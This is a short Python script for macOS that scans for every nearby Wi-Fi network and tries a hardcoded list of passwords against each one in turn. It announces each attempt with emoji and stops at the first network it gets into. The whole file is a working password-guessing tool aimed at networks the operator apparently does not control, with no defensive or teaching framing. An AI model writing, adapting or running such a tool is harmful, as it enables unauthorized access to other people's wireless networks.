import subprocess
import time
import sys
import os
import signal
import re

def get_wifi_ssids():
    ssids = []
    airport_path = "/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport"
    scan_output = subprocess.check_output([airport_path, "-s"]).decode("utf-8")
    scan_lines = scan_output.split("\n")[1:]
    for line in scan_lines:
        ssid_match = re.search(r'(?<=\s)[^\s]+(?:\s[^\s]+)*', line)
        if ssid_match:
            ssid = ssid_match.group(0)
            ssids.append(ssid)
    return ssids


def get_current_ssid():
    airport_path = "/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport"
    info_output = subprocess.check_output([airport_path, "-I"]).decode("utf-8")
    for line in info_output.split("\n"):
        if " SSID" in line:
            return line.split(":")[1].strip()
    return None

def connect_wifi(ssid, password):
    process = subprocess.run(["networksetup", "-setairportnetwork", "en0", ssid, password], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    if process.returncode == 0:
        current_ssid = get_current_ssid()
        if current_ssid == ssid:
            print(f"Successfully connected to {ssid} with password '{password}' ✅")
            return True
    else:
        return False



def try_multiple_passwords_on_all_networks(passwords):
    ssids = get_wifi_ssids()
    for ssid in ssids:
        for password in passwords:
            print(f"Trying to connect to {ssid} with password '{password}' 🧟")
            success = connect_wifi(ssid, password)
            if success:
                sys.exit(0)
            else:
                print(f"Failed to connect to {ssid} with password '{password}' ❌")
                pass
            time.sleep(3)

if __name__ == '__main__':
    passwords = ["password1", "Amir2001@", "password3"]
    try_multiple_passwords_on_all_networks(passwords)
